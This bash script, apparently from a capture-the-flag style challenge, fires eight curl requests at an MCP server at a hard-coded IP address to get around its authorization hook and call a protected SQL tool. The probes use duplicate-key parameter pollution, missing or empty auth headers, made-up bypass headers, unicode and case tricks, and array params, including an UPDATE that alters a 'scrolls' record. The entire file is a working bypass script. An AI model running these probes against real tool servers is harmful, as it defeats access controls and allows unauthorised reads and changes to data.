#!/bin/bash

# MCP Hook Bypass Testing via curl
# Tests various protocol-level bypass techniques without Python unicode issues

MCP_URL="http://154.57.164.77:30826/mcp"
AUTH_HEADER="Authorization: Bearer 靑"

log_result() {
    echo "$1"
    echo "$2" | grep -E '(result|error|auth)'
    echo
}

echo "Testing MCP Hook Bypass Techniques"
echo "Target: $MCP_URL"
echo "============================================================"

# Technique 1: Parameter Pollution
echo "=== Technique 1: Parameter Pollution ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "guardian_query_sql",
      "name": "list_scrolls",
      "arguments": {"query": "UPDATE scrolls SET scroll_availability = '"'"'Available'"'"' WHERE id = 7"}
    },
    "id": 1
  }' 2>&1)
log_result "$RESULT"

# Technique 2: No auth header (test if tool accessible without auth)
echo "=== Technique 2: No Auth Header ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "guardian_query_sql",
      "arguments": {"query": "SELECT * FROM scrolls"}
    },
    "id": 2
  }' 2>&1)
log_result "$RESULT"

# Technique 3: Wrong auth token with 靑
echo "=== Technique 3: Wrong Token Format ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: 靑" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "guardian_query_sql",
      "arguments": {"query": "SELECT * FROM scrolls"}
    },
    "id": 3
  }' 2>&1)
log_result "$RESULT"

# Technique 4: Custom bypass headers
echo "=== Technique 4: Custom Bypass Headers ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -H "X-Guardian-Bypass: true" \
  -H "X-Override-Auth: 1" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "guardian_query_sql",
      "arguments": {"query": "SELECT * FROM scrolls"}
    },
    "id": 4
  }' 2>&1)
log_result "$RESULT"

# Technique 5: Empty auth header
echo "=== Technique 5: Empty Auth ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: " \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "guardian_query_sql",
      "arguments": {"query": "SELECT * FROM scrolls"}
    },
    "id": 5
  }' 2>&1)
log_result "$RESULT"

# Technique 6: Unicode variations of guardian name
echo "=== Technique 6: Unicode Variation ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "\u0067uardian_query_sql",
      "arguments": {"query": "SELECT * FROM scrolls"}
    },
    "id": 6
  }' 2>&1)
log_result "$RESULT"

# Technique 7: Mixed-case method name
echo "=== Technique 7: Mixed-Case Method ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "jsonrpc": "2.0",
    "method": "TOOLS/call",
    "params": {
      "name": "guardian_query_sql",
      "arguments": {"query": "SELECT * FROM scrolls"}
    },
    "id": 7
  }' 2>&1)
log_result "$RESULT"

# Technique 8: Array params instead of object
echo "=== Technique 8: Array Params ==="
RESULT=$(curl -s -X POST "$MCP_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": ["guardian_query_sql", {"query": "SELECT * FROM scrolls"}],
    "id": 8
  }' 2>&1)
log_result "$RESULT"

echo "Testing complete. Check results for any non-auth errors."
